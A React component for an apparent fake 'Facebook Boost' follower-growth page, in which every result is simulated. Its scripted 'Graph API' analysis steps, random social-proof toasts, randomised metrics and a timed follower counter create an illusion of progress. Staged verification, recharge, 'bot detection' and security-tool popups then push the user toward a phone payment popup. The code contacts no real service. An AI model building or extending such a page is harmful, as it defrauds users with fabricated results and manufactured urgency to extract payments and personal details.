import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/enhanced-button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { MetricCounter } from "@/components/metric-counter"
import { Input } from "@/components/ui/input"
import { ArrowLeft, Facebook, Heart, MessageCircle, Share, Eye, TrendingUp, Users, Zap, Clock, CheckCircle, Star, ThumbsUp, Target, Search, Sparkles, Shield, Rocket } from "lucide-react"
import { useNavigate } from "react-router-dom"
import { cn } from "@/lib/utils"
import { VerificationPopup } from "@/components/verification-popup"
import { RechargePopup } from "@/components/recharge-popup"
import { CongratulationsPopup } from "@/components/congratulations-popup"
import { TransferAnimation } from "@/components/transfer-animation"
import { BotDetectionPopup } from "@/components/bot-detection-popup"
import { SecurityToolActivation } from "@/components/security-tool-activation"
import { PhonePaymentPopup } from "@/components/phone-payment-popup"
import { useToast } from "@/hooks/use-toast"

const FacebookBoost = () => {
  const navigate = useNavigate()
  const { toast } = useToast()
  
  // Form states
  const [pageName, setPageName] = useState("")
  const [userFollowers, setUserFollowers] = useState("")
  const [showForm, setShowForm] = useState(true)
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [analysisStep, setAnalysisStep] = useState(0)
  const [selectedPackage, setSelectedPackage] = useState<string>("")
  
  // Boost states
  const [isBoostActive, setIsBoostActive] = useState(false)
  const [boostProgress, setBoostProgress] = useState(0)
  const [currentFollowers, setCurrentFollowers] = useState(0)
  const [targetFollowers, setTargetFollowers] = useState(0)
  const [currentPageLikes, setCurrentPageLikes] = useState(18456)
  const [currentReach, setCurrentReach] = useState(89234)
  const [currentEngagement, setCurrentEngagement] = useState(12789)
  const [currentShares, setCurrentShares] = useState(4567)
  
  // Verification popup states
  const [showVerificationPopup, setShowVerificationPopup] = useState(false)
  const [verificationTriggered, setVerificationTriggered] = useState(false)
  const [showRechargePopup, setShowRechargePopup] = useState(false)
  const [rechargeTriggered, setRechargeTriggered] = useState(false)
  
  // Completion flow states
  const [showCongratulations, setShowCongratulations] = useState(false)
  const [showTransferAnimation, setShowTransferAnimation] = useState(false)
  const [showBotDetection, setShowBotDetection] = useState(false)
  const [showSecurityActivation, setShowSecurityActivation] = useState(false)
  const [showPhonePayment, setShowPhonePayment] = useState(false)
  
  // Social proof states
  const [socialProofs, setSocialProofs] = useState<Array<{id: number, pageName: string, followers: string, timeAgo: string}>>([])
  
  // Persistent timer for continuous progress
  const startTimeRef = useRef<number | null>(null)
  const DURATION_MS = 30 * 60 * 1000 // 30 minutes
  
  const analysisSteps = [
    "Connecting to Facebook Graph API...",
    "Analyzing page engagement...", 
    "Calculating audience insights...",
    "Optimizing post reach...",
    "Preparing viral strategy...",
    "Analysis complete!"
  ]
  
  const boostPackages = [
    {
      id: "community-starter",
      name: "Community Starter",
      followers: "2,000",
      description: "Build your tribe",
      features: ["Real followers", "Page likes boost", "Community management"],
      popular: true
    },
    {
      id: "viral-pro", 
      name: "Viral Pro",
      followers: "5,000",
      description: "Maximize your reach",
      features: ["Premium followers", "Post boosting", "Audience targeting"]
    },
    {
      id: "business-elite",
      name: "Business Elite", 
      followers: "10,000",
      description: "Scale your business",
      features: ["Elite followers", "Lead generation", "Advanced analytics"]
    }
  ]

  // Social proof toasts - only active during boost
  useEffect(() => {
    if (!isBoostActive) return

    const showRandomToast = () => {
      const pageNames = ["Local Business Co.", "Food Paradise", "Fitness Hub", "Tech Startup", "Beauty Salon", "Travel Agency", "Fashion Store", "Art Gallery"]
      const followerCounts = ["1,000", "2,500", "5,000", "10,000", "15,000"]
      const timeFrames = ["4 min ago", "8 min ago", "15 min ago", "22 min ago", "30 min ago"]
      
      const randomPage = pageNames[Math.floor(Math.random() * pageNames.length)]
      const randomFollowers = followerCounts[Math.floor(Math.random() * followerCounts.length)]
      const randomTime = timeFrames[Math.floor(Math.random() * timeFrames.length)]
      
      toast({
        title: (
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gradient-facebook rounded-full flex items-center justify-center">
              <Facebook className="w-4 h-4 text-white" />
            </div>
            <div>
              <p className="font-semibold text-foreground">{randomPage}</p>
              <p className="text-xs text-success">+{randomFollowers} • {randomTime}</p>
            </div>
            <Sparkles className="w-4 h-4 text-secondary animate-pulse ml-auto" />
          </div>
        ) as any,
        duration: 4000,
      })
    }
    
    // Show initial toast
    const initialTimeout = setTimeout(showRandomToast, 2000)
    
    // Set up interval for recurring toasts
    const interval = setInterval(showRandomToast, 5000)
    
    return () => {
      clearTimeout(initialTimeout)
      clearInterval(interval)
    }
  }, [isBoostActive])

  // Analysis process
  useEffect(() => {
    if (isAnalyzing) {
      const stepInterval = setInterval(() => {
        setAnalysisStep(prev => {
          if (prev >= analysisSteps.length - 1) {
            clearInterval(stepInterval)
            setTimeout(() => {
              setIsAnalyzing(false)
              setShowForm(false)
            }, 1000)
            return prev
          }
          return prev + 1
        })
      }, 1600)
      
      return () => clearInterval(stepInterval)
    }
  }, [isAnalyzing])

  // Boost progress effect with realistic drip animation (continuous timing)
  useEffect(() => {
    if (isBoostActive && targetFollowers > 0) {
      if (!startTimeRef.current) {
        startTimeRef.current = Date.now() - (boostProgress / 100) * DURATION_MS
      }
      const initialFollowers = parseInt(userFollowers || "0")
      
      const interval = setInterval(() => {
        const elapsed = Date.now() - (startTimeRef.current as number)
        const progressRatio = Math.min(elapsed / DURATION_MS, 1)
        const currentProgress = progressRatio * 100
        
        // Smooth progress bar update
        setBoostProgress(currentProgress)
        
        // Trigger verification popup at 60% if not already triggered
        if (currentProgress >= 60 && !verificationTriggered) {
          setShowVerificationPopup(true)
          setVerificationTriggered(true)
        }
        
        // Trigger recharge popup at 85% if not already triggered
        if (currentProgress >= 85 && !rechargeTriggered) {
          setShowRechargePopup(true)
          setRechargeTriggered(true)
        }
        
        // Trigger security activation at 99% if not already triggered
        if (currentProgress >= 99 && !showSecurityActivation) {
          setShowSecurityActivation(true)
        }
        
        // Calculate expected followers based on current progress
        // At 85% progress = 1800 followers gained
        // At 100% progress = 2000 followers gained
        let expectedFollowersGained;
        
        if (currentProgress <= 85) {
          // Linear growth from 0 to 1800 followers over 0-85% progress
          expectedFollowersGained = Math.floor((currentProgress / 85) * 1800);
        } else {
          // Slower growth from 1800 to 2000 followers over 85-100% progress
          const remainingProgress = currentProgress - 85;
          const remainingFollowers = 200; // 2000 - 1800
          expectedFollowersGained = 1800 + Math.floor((remainingProgress / 15) * remainingFollowers);
        }
        
        const expectedTotal = initialFollowers + expectedFollowersGained;
        
        // Realistic follower drip: add 1-3 followers when behind expected growth
        if (expectedTotal > currentFollowers && Math.random() < 0.4) {
          const increment = Math.min(
            Math.floor(Math.random() * 3) + 1, // 1-3 followers
            expectedTotal - currentFollowers, // Don't exceed expected
            targetFollowers - currentFollowers // Don't exceed final target
          )
          setCurrentFollowers(prev => prev + increment)
        }
        
        // Additional verification guard
        if (progressRatio >= 0.60 && !verificationTriggered) {
          setShowVerificationPopup(true)
          setVerificationTriggered(true)
        }
        
        // Complete the boost when time is up
        if (progressRatio >= 1.0) {
          setCurrentFollowers(targetFollowers)
          clearInterval(interval)
          setShowCongratulations(true)
        }
      }, 1000)
      
      return () => clearInterval(interval)
    } else {
      startTimeRef.current = null
    }
  }, [isBoostActive, targetFollowers, userFollowers, verificationTriggered, rechargeTriggered])

  const handleAnalyzePage = () => {
    if (pageName && userFollowers) {
      setIsAnalyzing(true)
      setAnalysisStep(0)
    }
  }
  
  const handleSelectPackage = (packageId: string) => {
    setSelectedPackage(packageId)
    const pkg = boostPackages.find(p => p.id === packageId)
    if (pkg) {
      const followers = parseInt(pkg.followers.replace(",", ""))
      setTargetFollowers(parseInt(userFollowers || "0") + followers)
    }
  }
  
  const handleStartBoost = () => {
    setIsBoostActive(true)
    setBoostProgress(0)
    setCurrentFollowers(parseInt(userFollowers || "0"))
    setVerificationTriggered(false) // Reset verification trigger for new boost
    setRechargeTriggered(false)
    setShowVerificationPopup(false)
    setShowRechargePopup(false)
    startTimeRef.current = Date.now()
    setShowForm(false) // Hide form and show boost dashboard
  }

  const handleVerificationClose = () => {
    setShowVerificationPopup(false)
  }

  const handleVerificationAccept = () => {
    setShowVerificationPopup(false)
    toast({
      title: "Boost Activated!",
      description: "Your account is now boosting with premium features.",
      duration: 3000,
    })
  }

  const handleRechargeClose = () => {
    setShowRechargePopup(false)
  }

  const handleRecharge = (packageId: string) => {
    setShowRechargePopup(false)
    // Ensure progress resumes from at least 25%
    setBoostProgress(prev => {
      const next = Math.max(prev, 25)
      startTimeRef.current = Date.now() - (next / 100) * DURATION_MS
      return next
    })
    setIsBoostActive(true)
    toast({
      title: "Recharge Successful!",
      description: "Your boost has been extended. Continuing to 100%...",
      duration: 3000,
    })
  }

  // Completion flow handlers
  const handleStartTransfer = () => {
    setShowCongratulations(false)
    setShowTransferAnimation(true)
  }

  const handleBotDetected = () => {
    setShowTransferAnimation(false)
    setShowBotDetection(true)
  }

  const handleRetryTransfer = () => {
    setShowBotDetection(false)
    toast({
      title: "Transfer Complete!",
      description: "All followers have been successfully transferred to your page.",
      duration: 3000,
    })
  }

  const handleUseSecurity = () => {
    setShowBotDetection(false)
    setShowSecurityActivation(true)
  }

  const handleActivateSecurity = () => {
    // From activation popup -> open phone payment
    setShowSecurityActivation(false)
    setShowPhonePayment(true)
  }

  const handlePaymentSuccess = () => {
    setShowPhonePayment(false)
    toast({
      title: "Security Tool Activated!",
      description: "Bots removed and transfer completed successfully.",
      duration: 5000,
    })
  }

  const handleTransferComplete = () => {
    setShowTransferAnimation(false)
    toast({
      title: "Transfer Complete!",
      description: "All followers have been successfully transferred to your page.",
      duration: 3000,
    })
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-secondary/5">
      {/* Header */}
      <div className="border-b border-card-border bg-card/50 backdrop-blur-md sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Button 
                variant="ghost" 
                size="icon"
                onClick={() => navigate("/")}
                className="hover:bg-card/80"
              >
                <ArrowLeft className="w-5 h-5" />
              </Button>
              <div className="flex items-center gap-3">
                <div className="p-2 bg-gradient-facebook rounded-lg">
                  <Facebook className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-xl font-bold text-foreground">Facebook Boost</h1>
                  <p className="text-sm text-muted-foreground">Build your community</p>
                </div>
              </div>
            </div>
            <Badge variant="secondary" className="bg-success/10 text-success border-success/20">
              <CheckCircle className="w-4 h-4 mr-1" />
              Business Plan
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">

        {/* Analysis Loading Modal */}
        {isAnalyzing && (
          <div className="fixed inset-0 bg-background/80 backdrop-blur-md flex items-center justify-center z-50 animate-in fade-in-0 duration-200">
            <Card className="w-full max-w-md mx-4 border-card-border bg-card backdrop-blur-sm animate-in zoom-in-95 slide-in-from-bottom-4 duration-300">
              <CardHeader className="text-center">
                <div className="w-16 h-16 bg-gradient-facebook rounded-full flex items-center justify-center mx-auto mb-4">
                  <Search className="w-8 h-8 text-white animate-pulse" />
                </div>
                <CardTitle className="text-xl text-foreground">Analyzing Page</CardTitle>
                <CardDescription>Optimizing community growth for {pageName}</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <Progress value={(analysisStep / (analysisSteps.length - 1)) * 100} className="h-2" />
                  <div className="text-center">
                    <p className="text-sm text-muted-foreground">{analysisSteps[analysisStep]}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Main Dashboard */}
          <div className="lg:col-span-2 space-y-6">
            {showForm ? (
              <>
                {/* Page Input Form */}
                <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                  <div className="absolute inset-0 bg-gradient-facebook opacity-10"></div>
                  <CardHeader className="relative z-10">
                    <CardTitle className="text-2xl text-foreground flex items-center gap-2">
                      <Facebook className="w-7 h-7 text-secondary" />
                      Facebook Community Builder
                    </CardTitle>
                    <CardDescription>Enter your page details to unlock explosive community growth</CardDescription>
                  </CardHeader>
                  <CardContent className="relative z-10 space-y-4 sm:space-y-6">
                    <div className="space-y-3 sm:space-y-4">
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">Facebook Page Name</label>
                        <Input
                          placeholder="Your Business Page"
                          value={pageName}
                          onChange={(e) => setPageName(e.target.value)}
                          className="h-10 sm:h-12 text-sm sm:text-base"
                        />
                      </div>
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">Current Followers</label>
                        <Input
                          placeholder="250"
                          type="number"
                          value={userFollowers}
                          onChange={(e) => setUserFollowers(e.target.value)}
                          className="h-10 sm:h-12 text-sm sm:text-base"
                        />
                      </div>
                    </div>
                    
                    <Button 
                      variant="facebook" 
                      size="xl" 
                      onClick={handleAnalyzePage}
                      disabled={!pageName || !userFollowers || isAnalyzing}
                      className="w-full h-12 sm:h-14 text-base sm:text-lg font-semibold"
                    >
                      <Search className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                      <span className="hidden sm:inline">Analyze Page & Show Growth Packages</span>
                      <span className="sm:hidden">Analyze Page</span>
                    </Button>
                  </CardContent>
                </Card>

                {/* Features Preview */}
                <div className="grid md:grid-cols-3 gap-4">
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-6">
                    <Shield className="w-8 h-8 text-success mx-auto mb-3" />
                    <h3 className="font-semibold text-foreground mb-2">Community Safe</h3>
                    <p className="text-sm text-muted-foreground">Authentic engagement that builds trust</p>
                  </Card>
                  
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-6">
                    <Rocket className="w-8 h-8 text-secondary mx-auto mb-3" />
                    <h3 className="font-semibold text-foreground mb-2">Viral Reach</h3>
                    <p className="text-sm text-muted-foreground">Expand your audience exponentially</p>
                  </Card>
                  
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-6">
                    <Target className="w-8 h-8 text-primary mx-auto mb-3" />
                    <h3 className="font-semibold text-foreground mb-2">Targeted Growth</h3>
                    <p className="text-sm text-muted-foreground">Connect with your ideal customers</p>
                  </Card>
                </div>
              </>
            ) : (
              <>
                {/* Boost Packages */}
                {!isBoostActive && (
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                    <div className="absolute inset-0 bg-gradient-facebook opacity-5"></div>
                    <CardHeader className="relative z-10">
                      <CardTitle className="text-2xl text-foreground flex items-center gap-2">
                        <Sparkles className="w-6 h-6 text-secondary" />
                        Choose Your Community Package
                      </CardTitle>
                      <CardDescription>Select the perfect boost for {pageName} ({userFollowers} followers)</CardDescription>
                    </CardHeader>
                    <CardContent className="relative z-10">
                      <div className="grid md:grid-cols-3 gap-4">
                        {boostPackages.map((pkg) => (
                          <Card
                            key={pkg.id}
                            className={cn(
                              "border-2 transition-all duration-300 hover:shadow-glow",
                              selectedPackage === pkg.id 
                                ? "border-secondary bg-secondary/5" 
                                : "border-card-border bg-card/30",
                              pkg.popular && "ring-2 ring-secondary/30"
                            )}
                          >
                            <CardHeader className="text-center relative">
                              {pkg.popular && (
                                <Badge className="absolute -top-2 left-1/2 -translate-x-1/2 bg-secondary text-secondary-foreground">
                                  Most Popular
                                </Badge>
                              )}
                              <CardTitle className="text-xl text-foreground">{pkg.name}</CardTitle>
                              <div className="text-3xl font-bold text-secondary">+{pkg.followers}</div>
                              <CardDescription>{pkg.description}</CardDescription>
                            </CardHeader>
                            <CardContent>
                              <ul className="space-y-2 text-sm mb-6">
                                {pkg.features.map((feature, i) => (
                                  <li key={i} className="flex items-center gap-2 text-muted-foreground">
                                    <CheckCircle className="w-4 h-4 text-success" />
                                    {feature}
                                  </li>
                                ))}
                              </ul>
                              <Button 
                                variant="facebook" 
                                size="lg" 
                                onClick={() => {
                                  handleSelectPackage(pkg.id)
                                  handleStartBoost()
                                }}
                                className="w-full h-12 text-base font-semibold"
                              >
                                <Zap className="w-4 h-4 mr-2" />
                                Start Community Boost
                              </Button>
                            </CardContent>
                          </Card>
                        ))}
                      </div>
                      
                    </CardContent>
                  </Card>
                )}

                {/* Live Follower Counter */}
                {isBoostActive && (
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                    <div className="absolute inset-0 bg-gradient-facebook opacity-5"></div>
                    <CardHeader className="relative z-10">
                      <div className="flex items-center justify-between">
                        <div>
                          <CardTitle className="text-2xl text-foreground flex items-center gap-2">
                            <Facebook className="w-6 h-6 text-secondary" />
                            {pageName} - Live Growth
                          </CardTitle>
                          <CardDescription className="text-muted-foreground text-sm leading-relaxed max-w-2xl">
                            Your follower count is growing in real-time! Do not interrupt the process. Once it's 100% complete, your followers will be visible in your account.
                          </CardDescription>
                        </div>
                        <Badge variant="secondary" className="bg-secondary/10 text-secondary border-secondary/20 animate-pulse">
                          <div className="w-2 h-2 bg-secondary rounded-full mr-2"></div>
                          CONNECTING
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="relative z-10">
                      <div className="text-center py-8">
                        <div className="text-6xl font-bold text-foreground mb-4">
                          <MetricCounter end={currentFollowers} duration={1000} />
                        </div>
                        <p className="text-lg text-muted-foreground mb-6">Total Followers</p>
                        
                        <div className="space-y-4">
                          <div className="flex items-center justify-between">
                            <span className="text-sm font-medium text-foreground">Community Growth</span>
                            <span className="text-sm text-muted-foreground">{Math.round(boostProgress)}%</span>
                          </div>
                          <Progress value={boostProgress} className="h-4" />
                          
                          <div className="grid grid-cols-2 gap-4 mt-6">
                            <div className="text-center p-4 bg-secondary/10 rounded-lg border border-secondary/20">
                              <div className="text-2xl font-bold text-secondary">
                                +<MetricCounter end={currentFollowers - parseInt(userFollowers || "0")} />
                              </div>
                              <p className="text-sm text-muted-foreground">New Followers</p>
                            </div>
                            <div className="text-center p-4 bg-success/10 rounded-lg border border-success/20">
                              <div className="text-2xl font-bold text-success">
                                <MetricCounter end={Math.floor(30 - (boostProgress / 100) * 30)} suffix=" min" />
                              </div>
                              <p className="text-sm text-muted-foreground">Time Remaining</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </>
            )}

            {/* Real-time Metrics */}
            <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4">
              <Card className={cn(
                "border-card-border bg-card/50 backdrop-blur-sm transition-all duration-500",
                isBoostActive && "shadow-glow animate-pulse"
              )}>
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <Eye className="w-5 h-5 text-secondary" />
                    {isBoostActive && (
                      <Badge variant="secondary" className="bg-secondary/10 text-secondary border-secondary/20 text-xs">
                        +{Math.floor(Math.random() * 400)} new
                      </Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-foreground">
                    <MetricCounter end={currentReach} />
                  </div>
                  <p className="text-sm text-muted-foreground">Post Reach</p>
                  {isBoostActive && (
                    <div className="flex items-center gap-1 mt-1">
                      <TrendingUp className="w-3 h-3 text-success" />
                      <span className="text-xs text-success">+54.2%</span>
                    </div>
                  )}
                </CardContent>
              </Card>

              <Card className={cn(
                "border-card-border bg-card/50 backdrop-blur-sm transition-all duration-500",
                isBoostActive && "shadow-glow animate-pulse"
              )}>
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <ThumbsUp className="w-5 h-5 text-primary" />
                    {isBoostActive && (
                      <Badge variant="secondary" className="bg-primary/10 text-primary border-primary/20 text-xs">
                        +{Math.floor(Math.random() * 20)} new
                      </Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-foreground">
                    <MetricCounter end={currentPageLikes} />
                  </div>
                  <p className="text-sm text-muted-foreground">Page Likes</p>
                  {isBoostActive && (
                    <div className="flex items-center gap-1 mt-1">
                      <TrendingUp className="w-3 h-3 text-success" />
                      <span className="text-xs text-success">+31.7%</span>
                    </div>
                  )}
                </CardContent>
              </Card>

              <Card className={cn(
                "border-card-border bg-card/50 backdrop-blur-sm transition-all duration-500",
                isBoostActive && "shadow-glow animate-pulse"
              )}>
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <Heart className="w-5 h-5 text-accent" />
                    {isBoostActive && (
                      <Badge variant="secondary" className="bg-accent/10 text-accent border-accent/20 text-xs">
                        +{Math.floor(Math.random() * 60)} new
                      </Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-foreground">
                    <MetricCounter end={currentEngagement} />
                  </div>
                  <p className="text-sm text-muted-foreground">Engagement</p>
                  {isBoostActive && (
                    <div className="flex items-center gap-1 mt-1">
                      <TrendingUp className="w-3 h-3 text-success" />
                      <span className="text-xs text-success">+47.9%</span>
                    </div>
                  )}
                </CardContent>
              </Card>

              <Card className={cn(
                "border-card-border bg-card/50 backdrop-blur-sm transition-all duration-500",
                isBoostActive && "shadow-glow animate-pulse"
              )}>
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <Share className="w-5 h-5 text-success" />
                    {isBoostActive && (
                      <Badge variant="secondary" className="bg-success/10 text-success border-success/20 text-xs">
                        +{Math.floor(Math.random() * 12)} new
                      </Badge>
                    )}
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-foreground">
                    <MetricCounter end={currentShares} />
                  </div>
                  <p className="text-sm text-muted-foreground">Shares</p>
                  {isBoostActive && (
                    <div className="flex items-center gap-1 mt-1">
                      <TrendingUp className="w-3 h-3 text-success" />
                      <span className="text-xs text-success">+62.3%</span>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>

            {/* Live Activity Feed */}
            {isBoostActive && (
              <Card className="border-card-border bg-card/50 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-lg text-foreground flex items-center gap-2">
                    <Clock className="w-5 h-5 text-secondary" />
                    Community Activity Feed
                  </CardTitle>
                  <CardDescription>Your community is growing and engaging for {pageName}</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3 max-h-60 overflow-y-auto">
                    {Array.from({ length: 12 }).map((_, i) => {
                      const activities = [
                        `New follower from ${["United States", "Canada", "Australia", "United Kingdom", "France"][Math.floor(Math.random() * 5)]}`,
                        `Post shared ${Math.floor(Math.random() * 25 + 5)} times`,
                        `New event attendee joined your workshop`,
                        `Page recommendation shared in ${Math.floor(Math.random() * 10 + 3)} groups`,
                        `New review: "Amazing service! Highly recommend 5⭐"`,
                        `Direct message from potential customer`
                      ]
                      return (
                        <div key={i} className="flex items-center gap-3 p-3 rounded-lg bg-card/30 animate-fade-in border border-card-border/50">
                          <div className="w-2 h-2 bg-secondary rounded-full animate-pulse"></div>
                          <Facebook className="w-4 h-4 text-secondary" />
                          <div className="flex-1">
                            <span className="text-sm text-foreground">
                              {activities[Math.floor(Math.random() * activities.length)]}
                            </span>
                            <div className="text-xs text-muted-foreground mt-1">
                              {Math.floor(Math.random() * 60)} seconds ago
                            </div>
                          </div>
                        </div>
                      )
                    })}
                  </div>
                </CardContent>
              </Card>
            )}
          </div>

          {/* Sidebar */}
          <div className="space-y-6">
            {/* Quick Actions */}
            <Card className="border-card-border bg-card/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-lg text-foreground">Community Tools</CardTitle>
                <CardDescription>Grow your Facebook presence</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                <Button variant="outline" size="sm" className="w-full justify-start">
                  <Target className="w-4 h-4 mr-2" />
                  Audience Insights
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start">
                  <ThumbsUp className="w-4 h-4 mr-2" />
                  Boost Posts
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start">
                  <Users className="w-4 h-4 mr-2" />
                  Group Management
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start">
                  <MessageCircle className="w-4 h-4 mr-2" />
                  Auto Messenger
                </Button>
              </CardContent>
            </Card>

            {/* Performance Summary */}
            <Card className="border-card-border bg-card/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-lg text-foreground flex items-center gap-2">
                  <Star className="w-5 h-5 text-primary" />
                  Community Health
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Community Score</span>
                  <Badge variant="secondary" className="bg-secondary/10 text-secondary border-secondary/20">
                    Thriving
                  </Badge>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Reach Boost</span>
                  <span className="text-sm font-semibold text-success">+290%</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">New Members</span>
                  <span className="text-sm font-semibold text-primary">+1,876</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Activity Rate</span>
                  <span className="text-sm font-semibold text-accent">18.4%</span>
                </div>
              </CardContent>
            </Card>

            {/* Success Tips */}
            <Card className="border-card-border bg-gradient-to-br from-secondary/5 to-primary/5 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-lg text-foreground">👥 Community Tips</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3 text-sm">
                <p className="text-muted-foreground">
                  <strong className="text-foreground">Post when active:</strong> Share content when your audience is online for maximum reach.
                </p>
                <p className="text-muted-foreground">
                  <strong className="text-foreground">Engage genuinely:</strong> Respond to comments and messages to build stronger connections.
                </p>
                <p className="text-muted-foreground">
                  <strong className="text-foreground">Use Facebook groups:</strong> Create or join groups to expand your community reach.
                </p>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Verification Popup */}
        <VerificationPopup
          username={pageName}
          currentFollowers={currentFollowers}
          isOpen={showVerificationPopup}
          onClose={handleVerificationClose}
          onVerify={handleVerificationAccept}
        />

        {/* Recharge Popup */}
        <RechargePopup
          isOpen={showRechargePopup}
          onClose={handleRechargeClose}
          onRecharge={handleRecharge}
          platform="facebook"
          currentFollowers={currentFollowers}
        />

        {/* Completion Flow Components */}
        <CongratulationsPopup
          isOpen={showCongratulations}
          onClose={() => setShowCongratulations(false)}
          onStartTransfer={handleStartTransfer}
          platform="facebook"
          followersGained={targetFollowers - parseInt(userFollowers || "0")}
          currentFollowers={targetFollowers}
        />

        <TransferAnimation
          isOpen={showTransferAnimation}
          onBotDetected={handleBotDetected}
          onTransferComplete={handleTransferComplete}
          platform="facebook"
          followersToTransfer={targetFollowers - parseInt(userFollowers || "0")}
        />

        <BotDetectionPopup
          isOpen={showBotDetection}
          onRetryTransfer={handleRetryTransfer}
          onUseSecurity={handleUseSecurity}
          platform="facebook"
        />

        <SecurityToolActivation
          isOpen={showSecurityActivation}
          onActivate={handleActivateSecurity}
          onClose={() => setShowSecurityActivation(false)}
          platform="facebook"
        />

        <PhonePaymentPopup
          isOpen={showPhonePayment}
          onPaymentSuccess={handlePaymentSuccess}
          onClose={() => setShowPhonePayment(false)}
          platform="facebook"
        />
      </div>
    </div>
  )
}

export default FacebookBoost